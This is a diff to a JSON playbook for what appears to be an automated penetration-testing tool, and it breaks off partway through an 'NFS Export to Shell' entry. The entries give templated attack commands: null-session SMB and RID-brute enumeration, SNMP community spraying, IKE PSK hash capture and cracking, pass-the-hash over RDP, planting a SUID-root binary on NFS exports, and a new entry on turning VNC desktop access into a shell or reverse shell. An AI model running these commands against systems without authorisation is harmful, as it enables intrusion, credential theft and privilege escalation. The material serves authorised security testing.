@@ -7,22 +7,64 @@
     {
       "id": "recon-smb-anon",
       "title": "Anonymous SMB Enumeration",
-      "hypothesis": "445/139 is worth probing before anything else: many hosts still allow a null or guest session, which hands you the share list, a RID-cycled account list, and occasionally readable files — all without a credential. Cheap, quiet, and often the first real lead.",
+      "hypothesis": "445/139 is worth probing before anything else: many hosts still allow a null or guest session, which hands you the share list, a RID-cycled account list, and occasionally readable files, all without a credential. Cheap, quiet, and often the first real lead.",
       "tool": "nxc",
-      "tools": ["nxc", "smbmap", "smbclient", "enum4linux-ng"],
-      "requires_any": ["smb.reachable", "port:445", "port:139"],
-      "produces": ["smb.shares", "ad.user_list"],
+      "tools": [
+        "nxc",
+        "smbmap",
+        "smbclient",
+        "enum4linux-ng"
+      ],
+      "requires_any": [
+        "smb.reachable",
+        "port:445",
+        "port:139"
+      ],
+      "produces": [
+        "smb.shares",
+        "ad.user_list"
+      ],
       "priority": 74,
       "phase": "enum",
-      "proves": "the anonymous SMB surface — shares reachable without auth and/or a RID-cycled user list",
-      "does_not_prove": "authenticated SMB access, a working credential, or a shell — a null session is disclosure, not access",
-      "report": {"finding": "Anonymous SMB Access", "severity": "medium"},
-      "refs": ["https://www.netexec.wiki/"],
+      "proves": "the anonymous SMB surface, shares reachable without auth and/or a RID-cycled user list",
+      "does_not_prove": "authenticated SMB access, a working credential, or a shell, a null session is disclosure, not access",
+      "report": {
+        "finding": "Anonymous SMB Access",
+        "severity": "medium"
+      },
+      "refs": [
+        "https://www.netexec.wiki/"
+      ],
       "commands": [
-        {"tool": "nxc", "run": "nxc smb {{target}} -u '' -p '' --shares", "note": "List shares over a null session; if the empty user is rejected, retry as guest with an empty password."},
-        {"tool": "smbmap", "run": "smbmap -H {{target}} -u '' -p ''", "note": "Same idea with read/write flags shown, so a writable share stands out immediately."},
-        {"tool": "nxc", "run": "nxc smb {{target}} -u guest -p '' --rid-brute", "note": "Cycle RIDs through the guest session to recover the full account list with no Kerberos traffic."},
-        {"tool": "enum4linux-ng", "run": "enum4linux-ng -A {{target}}", "note": "One-shot sweep of shares, users, groups, and password policy over RPC."}
+        {
+          "tool": "nxc",
+          "run": "nxc smb {{target}} -u '' -p ''",
+          "note": "Switchless probe first: confirm the host even accepts a null session (a [+] line) before you ask it for anything. If the empty user is rejected, retry as guest with an empty password. Once this proves a null or guest session, it drops out so you are not re-running a question you already answered.",
+          "settled_by": [
+            "smb.null_session",
+            "smb.guest_session"
+          ]
+        },
+        {
+          "tool": "nxc",
+          "run": "nxc smb {{target}} -u '' -p '' --shares",
+          "note": "List shares over a null session; if the empty user is rejected, retry as guest with an empty password."
+        },
+        {
+          "tool": "smbmap",
+          "run": "smbmap -H {{target}} -u '' -p ''",
+          "note": "Same idea with read/write flags shown, so a writable share stands out immediately."
+        },
+        {
+          "tool": "nxc",
+          "run": "nxc smb {{target}} -u guest -p '' --rid-brute",
+          "note": "Cycle RIDs through the guest session to recover the full account list with no Kerberos traffic."
+        },
+        {
+          "tool": "enum4linux-ng",
+          "run": "enum4linux-ng -A {{target}}",
+          "note": "One-shot sweep of shares, users, groups, and password policy over RPC."
+        }
       ]
     },
     {
@@ -30,18 +72,44 @@
       "title": "Web Service Triage",
       "hypothesis": "Fingerprint the stack before you fuzz it. The server, framework, and any CMS decide which wordlist and which checks are worth running; guessing blind wastes the noisy budget you'd rather spend once you know what you're looking at.",
       "tool": "whatweb",
-      "tools": ["whatweb", "curl"],
-      "requires_any": ["http.reachable", "port:80", "port:443", "port:8080", "port:8000", "port:8443"],
-      "produces": ["web.tech", "web.server"],
+      "tools": [
+        "whatweb",
+        "curl"
+      ],
+      "requires_any": [
+        "http.reachable",
+        "port:80",
+        "port:443",
+        "port:8080",
+        "port:8000",
+        "port:8443"
+      ],
+      "produces": [
+        "web.tech",
+        "web.server"
+      ],
       "priority": 70,
       "phase": "enum",
-      "proves": "the web stack fingerprint — server software, framework, and CMS/tech markers",
-      "does_not_prove": "any vulnerability, hidden path, or access — a fingerprint only points you at the right next check",
-      "report": {"finding": "Web Surface Identified", "severity": "informational"},
-      "refs": ["https://github.com/urbanadventurer/WhatWeb"],
+      "proves": "the web stack fingerprint, server software, framework, and CMS/tech markers",
+      "does_not_prove": "any vulnerability, hidden path, or access, a fingerprint only points you at the right next check",
+      "report": {
+        "finding": "Web Surface Identified",
+        "severity": "informational"
+      },
+      "refs": [
+        "https://github.com/urbanadventurer/WhatWeb"
+      ],
       "commands": [
-        {"tool": "whatweb", "run": "whatweb -a3 http://{{target}}", "note": "Aggressive fingerprint; switch the scheme to https for 443."},
-        {"tool": "curl", "run": "curl -sSI http://{{target}}", "note": "Raw response headers — server banner, powered-by, redirects, and cookies at a glance."}
+        {
+          "tool": "whatweb",
+          "run": "whatweb -a3 http://{{target}}",
+          "note": "Aggressive fingerprint; switch the scheme to https for 443."
+        },
+        {
+          "tool": "curl",
+          "run": "curl -sSI http://{{target}}",
+          "note": "Raw response headers, server banner, powered-by, redirects, and cookies at a glance."
+        }
       ]
     },
     {
@@ -49,18 +117,40 @@
       "title": "DNS Enumeration & Zone Transfer",
       "hypothesis": "A nameserver that answers a zone transfer (AXFR) simply gives you the internal host map. Even when AXFR is refused, record enumeration still surfaces mail hosts, subdomains, and the shape of the domain.",
       "tool": "dig",
-      "tools": ["dig", "dnsrecon", "dnsenum"],
-      "requires_any": ["dns.reachable", "port:53"],
-      "produces": ["dns.zone"],
+      "tools": [
+        "dig",
+        "dnsrecon",
+        "dnsenum"
+      ],
+      "requires_any": [
+        "dns.reachable",
+        "port:53"
+      ],
+      "produces": [
+        "dns.zone"
+      ],
       "priority": 66,
       "phase": "recon",
-      "proves": "DNS records, and — where the server is misconfigured — a full zone transfer (the internal host map)",
+      "proves": "DNS records, and (where the server is misconfigured) a full zone transfer (the internal host map)",
       "does_not_prove": "access of any kind; DNS data is reconnaissance",
-      "report": {"finding": "DNS Zone Transfer Permitted", "severity": "medium"},
-      "refs": ["https://github.com/darkoperator/dnsrecon"],
+      "report": {
+        "finding": "DNS Zone Transfer Permitted",
+        "severity": "medium"
+      },
+      "refs": [
+        "https://github.com/darkoperator/dnsrecon"
+      ],
       "commands": [
-        {"tool": "dig", "run": "dig axfr {{domain}} @{{target}}", "note": "The transfer attempt; a full record dump means AXFR is open and should be reported."},
-        {"tool": "dnsrecon", "run": "dnsrecon -d {{domain}} -n {{target}} -a", "note": "Standard record enumeration plus the AXFR attempt in a single run."}
+        {
+          "tool": "dig",
+          "run": "dig axfr {{domain}} @{{target}}",
+          "note": "The transfer attempt; a full record dump means AXFR is open and should be reported."
+        },
+        {
+          "tool": "dnsrecon",
+          "run": "dnsrecon -d {{domain}} -n {{target}} -a",
+          "note": "Standard record enumeration plus the AXFR attempt in a single run."
+        }
       ]
     },
     {
@@ -68,19 +158,49 @@
       "title": "SNMP Enumeration",
       "hypothesis": "UDP/161 is slow to scan and routinely skipped, so it's a favourite hiding spot for useful data. Find a readable community string ('public' is the usual first guess) and the MIB leaks processes, accounts, routes, and sometimes credentials embedded in config values.",
       "tool": "snmpwalk",
-      "tools": ["onesixtyone", "snmpwalk", "snmp-check"],
-      "requires_any": ["snmp.reachable", "port:161", "scan.nmap.udp"],
-      "produces": ["snmp.community", "snmp.info", "ad.user_list", "credential.candidate"],
+      "tools": [
+        "onesixtyone",
+        "snmpwalk",
+        "snmp-check"
+      ],
+      "requires_any": [
+        "snmp.reachable",
+        "port:161",
+        "scan.nmap.udp"
+      ],
+      "produces": [
+        "snmp.community",
+        "snmp.info",
+        "ad.user_list",
+        "credential.candidate"
+      ],
       "priority": 64,
       "phase": "enum",
       "proves": "a readable SNMP community string and the system information it exposes",
-      "does_not_prove": "device control or a validated OS credential — SNMP read access is information disclosure",
-      "report": {"finding": "SNMP Information Disclosure", "severity": "low"},
-      "refs": ["https://github.com/trailofbits/onesixtyone"],
+      "does_not_prove": "device control or a validated OS credential, SNMP read access is information disclosure",
+      "report": {
+        "finding": "SNMP Information Disclosure",
+        "severity": "low"
+      },
+      "refs": [
+        "https://github.com/trailofbits/onesixtyone"
+      ],
       "commands": [
-        {"tool": "onesixtyone", "run": "onesixtyone -c /usr/share/seclists/Discovery/SNMP/snmp.txt {{target}}", "note": "Spray community strings first — you need a valid one before walking anything."},
-        {"tool": "snmpwalk", "run": "snmpwalk -v2c -c public {{target}}", "note": "Walk the tree with the community you found (defaults to 'public')."},
-        {"tool": "snmp-check", "run": "snmp-check {{target}} -c public", "note": "A tidier, sectioned view — accounts, processes, network, installed software."}
+        {
+          "tool": "onesixtyone",
+          "run": "onesixtyone -c /usr/share/seclists/Discovery/SNMP/snmp.txt {{target}}",
+          "note": "Spray community strings first, you need a valid one before walking anything."
+        },
+        {
+          "tool": "snmpwalk",
+          "run": "snmpwalk -v2c -c public {{target}}",
+          "note": "Walk the tree with the community you found (defaults to 'public')."
+        },
+        {
+          "tool": "snmp-check",
+          "run": "snmp-check {{target}} -c public",
+          "note": "A tidier, sectioned view, accounts, processes, network, installed software."
+        }
       ]
     },
     {
@@ -88,19 +208,43 @@
       "title": "IKE / IPSec VPN Enumeration",
       "hypothesis": "An IKE endpoint that still accepts aggressive mode returns a PSK hash inside the handshake, which you can crack offline. UDP/500 is easy to overlook on a scan; when it's open, that PSK is often the entire objective.",
       "tool": "ike-scan",
-      "tools": ["ike-scan", "psk-crack"],
-      "requires_any": ["port:500"],
-      "produces": ["hash.ike_psk"],
+      "tools": [
+        "ike-scan",
+        "psk-crack"
+      ],
+      "requires_any": [
+        "port:500"
+      ],
+      "produces": [
+        "hash.ike_psk"
+      ],
       "priority": 58,
       "phase": "enum",
       "proves": "an aggressive-mode IKE handshake that yields a crackable PSK hash",
-      "does_not_prove": "the PSK plaintext or any VPN access — the hash must be cracked, then the credential validated",
-      "report": {"finding": "IPSec VPN Endpoint with Aggressive Mode", "severity": "medium"},
-      "refs": ["https://github.com/royhills/ike-scan"],
+      "does_not_prove": "the PSK plaintext or any VPN access, the hash must be cracked, then the credential validated",
+      "report": {
+        "finding": "IPSec VPN Endpoint with Aggressive Mode",
+        "severity": "medium"
+      },
+      "refs": [
+        "https://github.com/royhills/ike-scan"
+      ],
       "commands": [
-        {"tool": "ike-scan", "run": "sudo ike-scan -M {{target}}", "note": "Fingerprint the endpoint in main mode first."},
-        {"tool": "ike-scan", "run": "sudo ike-scan -M -A --pskcrack=ike-psk.txt {{target}}", "note": "Aggressive mode; writes the captured PSK hash to ike-psk.txt when the endpoint permits it."},
-        {"tool": "psk-crack", "run": "psk-crack -d {{wordlist}} ike-psk.txt", "note": "Dictionary-crack the captured hash offline."}
+        {
+          "tool": "ike-scan",
+          "run": "sudo ike-scan -M {{target}}",
+          "note": "Fingerprint the endpoint in main mode first."
+        },
+        {
+          "tool": "ike-scan",
+          "run": "sudo ike-scan -M -A --pskcrack=ike-psk.txt {{target}}",
+          "note": "Aggressive mode; writes the captured PSK hash to ike-psk.txt when the endpoint permits it."
+        },
+        {
+          "tool": "psk-crack",
+          "run": "psk-crack -d {{wordlist}} ike-psk.txt",
+          "note": "Dictionary-crack the captured hash offline."
+        }
       ]
     },
     {
@@ -108,57 +252,165 @@
       "title": "Finger Service User Enumeration",
       "hypothesis": "The finger service (TCP/79) will tell you which accounts exist. It's uncommon, but on older Unix targets it's a free, unauthenticated way to build a username list for spraying.",
       "tool": "finger",
-      "tools": ["finger"],
-      "requires_any": ["port:79"],
-      "produces": ["ad.user_list"],
+      "tools": [
+        "finger"
+      ],
+      "requires_any": [
+        "port:79"
+      ],
+      "produces": [
+        "ad.user_list"
+      ],
       "priority": 52,
       "phase": "enum",
       "proves": "system usernames disclosed by the finger service",
-      "does_not_prove": "a credential or access — a username is spray material, not a login",
-      "report": {"finding": "User Enumeration via Finger Service", "severity": "low"},
-      "refs": ["https://book.hacktricks.xyz/network-services-pentesting/pentesting-finger"],
+      "does_not_prove": "a credential or access, a username is spray material, not a login",
+      "report": {
+        "finding": "User Enumeration via Finger Service",
+        "severity": "low"
+      },
+      "refs": [
+        "https://book.hacktricks.xyz/network-services-pentesting/pentesting-finger"
+      ],
       "commands": [
-        {"tool": "finger", "run": "finger @{{target}}", "note": "Show currently logged-in users."},
-        {"tool": "finger", "run": "finger root@{{target}}", "note": "Probe a named account to confirm it exists and read its shell/home."}
+        {
+          "tool": "finger",
+          "run": "finger @{{target}}",
+          "note": "Show currently logged-in users."
+        },
+        {
+          "tool": "finger",
+          "run": "finger root@{{target}}",
+          "note": "Probe a named account to confirm it exists and read its shell/home."
+        }
       ]
     },
     {
       "id": "recon-vnc",
       "title": "VNC Enumeration",
-      "hypothesis": "An exposed VNC service (5900/5901) is worth checking for no-auth access or a known auth bypass. Read the authentication mode first — a passwordless VNC is a straight desktop, but you confirm that by connecting, not by assuming.",
-      "tool": "nmap",
-      "tools": ["nmap", "vncviewer"],
-      "requires_any": ["port:5900", "port:5901", "port:5800"],
+      "hypothesis": "An exposed VNC service (5900/5901) is worth checking for no-auth access or a known auth bypass. Read the authentication mode first, a passwordless VNC is a straight desktop, but you confirm that by connecting, not by assuming.",
+      "tool": "nxc",
+      "tools": [
+        "nxc",
+        "nmap",
+        "vncviewer"
+      ],
+      "requires_any": [
+        "port:5900",
+        "port:5901",
+        "port:5800"
+      ],
       "produces": [],
       "priority": 50,
       "phase": "enum",
       "autonomy": "manual",
       "proves": "VNC exposure and its authentication mode",
-      "does_not_prove": "desktop access — a no-auth or bypassed VNC has to be connected to and confirmed by hand before any access is claimed",
-      "report": {"finding": "VNC Service Exposure", "severity": "medium"},
-      "refs": ["https://book.hacktricks.xyz/network-services-pentesting/pentesting-vnc"],
+      "does_not_prove": "desktop access, a no-auth or bypassed VNC has to be connected to and confirmed by hand before any access is claimed",
+      "report": {
+        "finding": "VNC Service Exposure",
+        "severity": "medium"
+      },
+      "refs": [
+        "https://book.hacktricks.xyz/network-services-pentesting/pentesting-vnc"
+      ],
       "commands": [
-        {"tool": "nmap", "run": "nmap -p 5900,5901 --script vnc-info,realvnc-auth-bypass {{target}}", "note": "Report the auth mode and check the RealVNC bypass; a hit is a lead to verify, not proof."},
-        {"tool": "vncviewer", "run": "vncviewer {{target}}:5900", "note": "Connect manually — this is where access is actually confirmed, by hand."}
+        {
+          "tool": "nxc",
+          "run": "nxc vnc {{target}} -p '{{password}}'",
+          "note": "PREFERRED, from Kali: nxc checks VNC auth and connects; a [+]/(Pwn3d!) or 'No password required' means a usable desktop (obol records access.desktop). Drop -p for the no-auth check. Point {{target}} at a subnet to find every open VNC at once."
+        },
+        {
+          "tool": "nmap",
+          "run": "nmap -p 5900,5901 --script vnc-info,realvnc-auth-bypass {{target}}",
+          "note": "Report the auth mode and check the RealVNC bypass; a hit is a lead to verify, not proof."
+        },
+        {
+          "tool": "vncviewer",
+          "run": "vncviewer {{target}}:5900",
+          "note": "Connect manually, this is where access is actually confirmed, by hand."
+        }
+      ]
+    },
+    {
+      "id": "vnc-desktop-shell",
+      "title": "VNC Desktop to Shell",
+      "hypothesis": "A VNC session (unauthenticated, or a cracked/short VNC password) puts you at the victim's live desktop - and a desktop is one terminal away from a shell. Open a terminal in the session and run your commands, or type a reverse shell straight in. The graphical foothold becomes a real one.",
+      "tool": "vncviewer",
+      "tools": [
+        "vncviewer",
+        "xdotool"
+      ],
+      "os": [
+        "linux"
+      ],
+      "requires_all": [
+        "access.desktop"
+      ],
+      "produces": [
+        "foothold.linux"
+      ],
+      "priority": 52,
+      "proves": "command execution from the VNC desktop session \u2014 a foothold",
+      "does_not_prove": "privilege beyond the desktop user; escalate from the shell",
+      "report": {
+        "finding": "Interactive VNC Desktop Access",
+        "severity": "high"
+      },
+      "refs": [
+        "https://book.hacktricks.xyz/network-services-pentesting/pentesting-vnc"
+      ],
+      "commands": [
+        {
+          "tool": "vncviewer",
+          "run": "vncviewer {{target}}::5900",
+          "note": "Connect to the desktop (add -passwd pass.txt for a cracked password). Open a terminal application in the session."
+        },
+        {
+          "tool": "xdotool",
+          "run": "id; hostname; ip -4 addr | grep inet",
+          "note": "In the desktop's terminal, run this and screenshot the frame \u2014 that captures the foothold with host identity. From here enumerate for root exactly like any shell."
+        }
       ]
     },
     {
       "id": "recon-smtp",
       "title": "SMTP User Enumeration",
-      "hypothesis": "A mail server that honours VRFY/EXPN/RCPT will confirm which usernames are real — a quiet oracle that feeds a spray list. An open relay, if present, is a separate finding worth its own note.",
+      "hypothesis": "A mail server that honours VRFY/EXPN/RCPT will confirm which usernames are real, a quiet oracle that feeds a spray list. An open relay, if present, is a separate finding worth its own note.",
       "tool": "smtp-user-enum",
-      "tools": ["smtp-user-enum", "swaks"],
-      "requires_any": ["port:25", "port:587", "port:465"],
-      "produces": ["ad.user_list"],
+      "tools": [
+        "smtp-user-enum",
+        "swaks"
+      ],
+      "requires_any": [
+        "port:25",
+        "port:587",
+        "port:465"
+      ],
+      "produces": [
+        "ad.user_list"
+      ],
       "priority": 54,
       "phase": "enum",
       "proves": "valid mailbox/user names disclosed via VRFY/RCPT",
-      "does_not_prove": "a credential, relay abuse, or access — the names are spray material only",
-      "report": {"finding": "SMTP User Enumeration", "severity": "medium"},
-      "refs": ["https://github.com/pentestmonkey/smtp-user-enum"],
+      "does_not_prove": "a credential, relay abuse, or access, the names are spray material only",
+      "report": {
+        "finding": "SMTP User Enumeration",
+        "severity": "medium"
+      },
+      "refs": [
+        "https://github.com/pentestmonkey/smtp-user-enum"
+      ],
       "commands": [
-        {"tool": "smtp-user-enum", "run": "smtp-user-enum -M VRFY -U {{userlist}} -t {{target}}", "note": "Probe with VRFY; fall back to -M RCPT when VRFY is disabled."},
-        {"tool": "swaks", "run": "swaks --to test@{{domain}} --server {{target}}", "note": "Drive a manual transaction, which also reveals relay behaviour."}
+        {
+          "tool": "smtp-user-enum",
+          "run": "smtp-user-enum -M VRFY -U {{userlist}} -t {{target}}",
+          "note": "Probe with VRFY; fall back to -M RCPT when VRFY is disabled."
+        },
+        {
+          "tool": "swaks",
+          "run": "swaks --to test@{{domain}} --server {{target}}",
+          "note": "Drive a manual transaction, which also reveals relay behaviour."
+        }
       ]
     },
     {
@@ -166,82 +418,1389 @@
       "title": "FTP Enumeration",
       "hypothesis": "Anonymous FTP or a world-readable/writable directory is a classic entry point: configs, backups, and source drop straight into your loot, and a writable directory that maps to a webroot can stage a shell.",
       "tool": "nxc",
-      "tools": ["nxc", "ftp", "curl"],
-      "requires_any": ["ftp.reachable", "port:21"],
-      "produces": ["loot.files"],
+      "tools": [
+        "nxc",
+        "ftp",
+        "curl"
+      ],
+      "requires_any": [
+        "ftp.reachable",
+        "port:21"
+      ],
+      "produces": [
+        "loot.files"
+      ],
       "priority": 60,
       "phase": "recon",
-      "proves": "the FTP access surface — anonymous login and any readable files",
-      "does_not_prove": "a working credential, write access, or a foothold — a directory listing is loot, not a shell",
-      "report": {"finding": "FTP Anonymous Access", "severity": "medium"},
-      "refs": ["https://book.hacktricks.xyz/network-services-pentesting/pentesting-ftp"],
+      "proves": "the FTP access surface, anonymous login and any readable files",
+      "does_not_prove": "a working credential, write access, or a foothold, a directory listing is loot, not a shell",
+      "report": {
+        "finding": "FTP Anonymous Access",
+        "severity": "medium"
+      },
+      "refs": [
+        "https://book.hacktricks.xyz/network-services-pentesting/pentesting-ftp"
+      ],
       "commands": [
-        {"tool": "nxc", "run": "nxc ftp {{target}} -u anonymous -p ''", "note": "Check anonymous login across the host."},
-        {"tool": "curl", "run": "curl ftp://{{target}}/ --user anonymous:anonymous", "note": "List the root directory over anonymous FTP."},
-        {"tool": "ftp", "run": "ftp {{target}}", "note": "Interactive session: log in anonymous/anonymous, then ls, get, and test put for a writable directory."}
+        {
+          "tool": "nxc",
+          "run": "nxc ftp {{target}} -u anonymous -p ''",
+          "note": "Check anonymous login across the host."
+        },
+        {
+          "tool": "curl",
+          "run": "curl ftp://{{target}}/ --user anonymous:anonymous",
+          "note": "List the root directory over anonymous FTP."
+        },
+        {
+          "tool": "ftp",
+          "run": "ftp {{target}}",
+          "note": "Interactive session: log in anonymous/anonymous, then ls, get, and test put for a writable directory."
+        }
       ]
     },
     {
       "id": "recon-mail",
       "title": "POP3 / IMAP Enumeration",
-      "hypothesis": "A mail service (POP3 110/995, IMAP 143/993) discloses its software and capabilities, and the NTLM-info NSE scripts leak the AD domain and host name the same way SMB does. Mail is also where credentials and password-reset material live, so a validated login is high value — read the capabilities first, then log in with any credential you already hold.",
+      "hypothesis": "A mail service (POP3 110/995, IMAP 143/993) discloses its software and capabilities, and the NTLM-info NSE scripts leak the AD domain and host name the same way SMB does. Mail is also where credentials and password-reset material live, so a validated login is high value, read the capabilities first, then log in with any credential you already hold.",
       "tool": "nmap",
-      "tools": ["nmap", "openssl", "curl"],
-      "requires_any": ["port:110", "port:143", "port:993", "port:995"],
+      "tools": [
+        "nmap",
+        "openssl",
+        "curl"
+      ],
+      "requires_any": [
+        "port:110",
+        "port:143",
+        "port:993",
+        "port:995"
+      ],
       "produces": [],
       "priority": 52,
       "phase": "enum",
       "proves": "the mail service's version + capabilities, and any NTLM-disclosed domain/host",
-      "does_not_prove": "a credential or mailbox access — capabilities are recon; reading mail needs a validated login (which the credential lane provides)",
-      "report": {"finding": "POP3/IMAP Service Exposure", "severity": "low"},
-      "refs": ["https://book.hacktricks.xyz/network-services-pentesting/pentesting-pop", "https://book.hacktricks.xyz/network-services-pentesting/pentesting-imap"],
+      "does_not_prove": "a credential or mailbox access, capabilities are recon; reading mail needs a validated login (which the credential lane provides)",
+      "report": {
+        "finding": "POP3/IMAP Service Exposure",
+        "severity": "low"
+      },
+      "refs": [
+        "https://book.hacktricks.xyz/network-services-pentesting/pentesting-pop",
+        "https://book.hacktricks.xyz/network-services-pentesting/pentesting-imap"
+      ],
       "commands": [
-        {"tool": "nmap", "run": "nmap -sV -p 110,143,993,995 --script \"pop3-capabilities,pop3-ntlm-info,imap-capabilities,imap-ntlm-info\" {{target}}", "note": "Capabilities + version; the *-ntlm-info scripts disclose the domain/host name on an AD-joined mail server (spray/context material)."},
-        {"tool": "openssl", "run": "openssl s_client -crlf -connect {{target}}:993", "note": "Read the IMAPS banner/cert directly (use :995 for POP3S). The cert CN/SAN often names the real host."},
-        {"tool": "curl", "run": "curl -k --url \"imaps://{{target}}\" --user '{{user}}:{{password}}'", "note": "With a held credential, list the mailbox (imaps for IMAP, pop3s://…/1 for POP3). Mail is a classic place to find further creds/reset links."}
+        {
+          "tool": "nmap",
+          "run": "nmap -sV -p 110,143,993,995 --script \"pop3-capabilities,pop3-ntlm-info,imap-capabilities,imap-ntlm-info\" {{target}}",
+          "note": "Capabilities + version; the *-ntlm-info scripts disclose the domain/host name on an AD-joined mail server (spray/context material)."
+        },
+        {
+          "tool": "openssl",
+          "run": "openssl s_client -crlf -connect {{target}}:993",
+          "note": "Read the IMAPS banner/cert directly (use :995 for POP3S). The cert CN/SAN often names the real host."
+        },
+        {
+          "tool": "curl",
+          "run": "curl -k --url \"imaps://{{target}}\" --user '{{user}}:{{password}}'",
+          "note": "With a held credential, list the mailbox (imaps for IMAP, pop3s://\u2026/1 for POP3). Mail is a classic place to find further creds/reset links."
+        }
       ]
     },
     {
       "id": "rdp-enum",
       "title": "RDP Enumeration (nxc)",
-      "hypothesis": "RDP (3389) discloses the host/domain name and its NLA/auth mode unauthenticated, and — with a credential or NT hash you already hold — netexec validates access over RDP and grabs a login screenshot. A `[+]` (or `pwned!`) is confirmed access material; open the session to use it. Pass-the-hash works against RDP when Restricted Admin is enabled.",
+      "hypothesis": "RDP (3389) discloses the host/domain name and its NLA/auth mode unauthenticated, and (with a credential or NT hash you already hold) netexec validates access over RDP and grabs a login screenshot. A `[+]` (or `pwned!`) is confirmed access material; open the session to use it. Pass-the-hash works against RDP when Restricted Admin is enabled.",
       "tool": "nxc",
-      "tools": ["nxc", "xfreerdp", "nmap"],
-      "requires_any": ["rdp.reachable", "port:3389"],
+      "tools": [
+        "nxc",
+        "xfreerdp",
+        "nmap"
+      ],
+      "requires_any": [
+        "rdp.reachable",
+        "port:3389"
+      ],
       "produces": [],
       "priority": 54,
       "phase": "enum",
       "autonomy": "approve",
-      "proves": "RDP exposure, its NLA/auth mode, and — with a credential — validated access + a screenshot",
-      "does_not_prove": "an interactive desktop — a netexec `[+]` is validated login material; the RDP session (sessions layer) is where access is actually taken and proven",
-      "report": {"finding": "RDP Service Exposure", "severity": "low"},
-      "refs": ["https://www.netexec.wiki/rdp-protocol", "https://book.hacktricks.xyz/network-services-pentesting/pentesting-rdp"],
+      "proves": "RDP exposure, its NLA/auth mode, and (with a credential) validated access + a screenshot",
+      "does_not_prove": "an interactive desktop, a netexec `[+]` is validated login material; the RDP session (sessions layer) is where access is actually taken and proven",
+      "report": {
+        "finding": "RDP Service Exposure",
+        "severity": "low"
+      },
+      "refs": [
+        "https://www.netexec.wiki/rdp-protocol",
+        "https://book.hacktricks.xyz/network-services-pentesting/pentesting-rdp"
+      ],
       "commands": [
-        {"tool": "nxc", "run": "nxc rdp {{target}} -u '' -p ''", "note": "Unauthenticated: netexec prints the host name, domain, OS build and NLA state — context with zero credentials and no lockout risk."},
-        {"tool": "nxc", "run": "nxc rdp {{target}} -u {{user}} -p '{{password}}'", "note": "Validate a held credential over RDP. Mind account lockout — this is a login attempt, so approve it deliberately."},
-        {"tool": "nxc", "run": "nxc rdp {{target}} -u {{user}} -H {{nthash}}", "note": "Pass-the-hash over RDP (works when Restricted Admin mode is enabled) — no plaintext needed."},
-        {"tool": "nxc", "run": "nxc rdp {{target}} -u {{user}} -p '{{password}}' --screenshot", "note": "Grab a login/desktop screenshot as a lead/proof (a logged-in session sometimes screenshots straight to the desktop)."},
-        {"tool": "xfreerdp", "run": "xfreerdp /v:{{target}} /u:{{user}} /p:'{{password}}' +clipboard /dynamic-resolution /cert:ignore", "note": "Open the interactive session — this is where desktop access is actually taken (use /pth:{{nthash}} instead of /p for pass-the-hash)."}
+        {
+          "tool": "nxc",
+          "run": "nxc rdp {{target}} -u '' -p ''",
+          "note": "Unauthenticated: netexec prints the host name, domain, OS build and NLA state, context with zero credentials and no lockout risk."
+        },
+        {
+          "tool": "nxc",
+          "run": "nxc rdp {{target}} -u {{user}} -p '{{password}}'",
+          "note": "Validate a held credential over RDP. Mind account lockout, this is a login attempt, so approve it deliberately."
+        },
+        {
+          "tool": "nxc",
+          "run": "nxc rdp {{target}} -u {{user}} -H {{nthash}}",
+          "note": "Pass-the-hash over RDP (works when Restricted Admin mode is enabled), no plaintext needed."
+        },
+        {
+          "tool": "nxc",
+          "run": "nxc rdp {{target}} -u {{user}} -p '{{password}}' --screenshot",
+          "note": "Grab a login/desktop screenshot as a lead/proof (a logged-in session sometimes screenshots straight to the desktop)."
+        },
+        {
+          "tool": "xfreerdp",
+          "run": "xfreerdp /v:{{target}} /u:{{user}} /p:'{{password}}' +clipboard /dynamic-resolution /cert:ignore",
+          "note": "Open the interactive session, this is where desktop access is actually taken (use /pth:{{nthash}} instead of /p for pass-the-hash)."
+        }
       ]
     },
     {
       "id": "nfs-enum",
       "title": "NFS Share Enumeration (nxc)",
-      "hypothesis": "An NFS server (2049) exports directories that are frequently world-readable or mountable with a forged UID. List the exports, mount them, and read — and note any export without root_squash, which is a direct privesc lead (mount, drop a SUID root binary, run it).",
+      "hypothesis": "An NFS server (2049) exports directories that are frequently world-readable or mountable with a forged UID. List the exports, mount them, and read, and note any export without root_squash, which is a direct privesc lead (mount, drop a SUID root binary, run it).",
       "tool": "nxc",
-      "tools": ["nxc", "showmount", "mount"],
-      "requires_any": ["port:2049"],
-      "produces": [],
+      "tools": [
+        "nxc",
+        "showmount",
+        "mount"
+      ],
+      "requires_any": [
+        "port:2049"
+      ],
+      "produces": [
+        "loot.files"
+      ],
       "priority": 52,
       "phase": "enum",
       "proves": "the exported NFS shares and their access options (e.g. no_root_squash)",
-      "does_not_prove": "file access or privesc — mount and read to confirm; a no_root_squash export is a lead the privesc lane turns into root, not proof on its own",
-      "report": {"finding": "NFS Export Exposure", "severity": "medium"},
-      "refs": ["https://book.hacktricks.xyz/network-services-pentesting/nfs-service-pentesting"],
+      "does_not_prove": "file access or privesc, mount and read to confirm; a no_root_squash export is a lead the privesc lane turns into root, not proof on its own",
+      "report": {
+        "finding": "NFS Export Exposure",
+        "severity": "medium"
+      },
+      "refs": [
+        "https://book.hacktricks.xyz/network-services-pentesting/nfs-service-pentesting"
+      ],
       "commands": [
-        {"tool": "nxc", "run": "nxc nfs {{target}} --shares", "note": "netexec lists the exports and their permissions in one shot; add --enum-shares for a recursive listing of readable files."},
-        {"tool": "showmount", "run": "showmount -e {{target}}", "note": "The classic export list. Watch for `*` (world) or a broad CIDR, and for missing root_squash."},
-        {"tool": "mount", "run": "mkdir -p /mnt/nfs && sudo mount -t nfs {{target}}:/<export> /mnt/nfs -o nolock", "note": "Mount an export read it. On a no_root_squash export you can plant a SUID-root binary from your box and execute it on the target for root."}
+        {
+          "tool": "nxc",
+          "run": "nxc nfs {{target}} --shares",
+          "note": "netexec lists the exports and their permissions in one shot; add --enum-shares for a recursive listing of readable files."
+        },
+        {
+          "tool": "showmount",
+          "run": "showmount -e {{target}}",
+          "note": "The classic export list. Watch for `*` (world) or a broad CIDR, and for missing root_squash."
+        },
+        {
+          "tool": "mount",
+          "run": "mkdir -p /mnt/nfs && sudo mount -t nfs {{target}}:/{{export}} /mnt/nfs -o nolock",
+          "note": "Mount an export read it. On a no_root_squash export you can plant a SUID-root binary from your box and execute it on the target for root."
+        }
+      ]
+    },
+    {
+      "id": "nfs-to-foothold",
+      "title": "NFS Export to Shell",
